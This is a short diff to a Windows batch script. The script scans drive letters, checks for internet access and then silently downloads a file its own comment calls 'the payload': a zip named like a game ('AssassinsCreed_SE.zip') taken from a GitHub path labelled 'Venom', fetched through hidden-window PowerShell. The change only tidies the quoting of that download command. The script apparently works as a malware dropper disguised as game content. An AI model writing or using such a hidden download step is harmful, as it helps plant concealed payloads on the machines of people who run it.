@@ -49,7 +49,7 @@ for %%d in (D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
 @rem Check internet connectivity before downloading the payload
 call :check_internet
 
-powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://github.com/P0k3m0n-unleashed/ProjSucc/raw/refs/heads/master/Venom/AssassinsCreed_SE.zip -OutFile AssassinsCreed_SE.zip"
+powershell.exe -windowstyle hidden -Command "Invoke-WebRequest -Uri 'https://github.com/P0k3m0n-unleashed/ProjSucc/raw/refs/heads/master/Venom/AssassinsCreed_SE.zip' -OutFile 'AssassinsCreed_SE.zip'"
 
 set desktop=C:\Users\%USERNAME%\Desktop
 set wd=%CD%
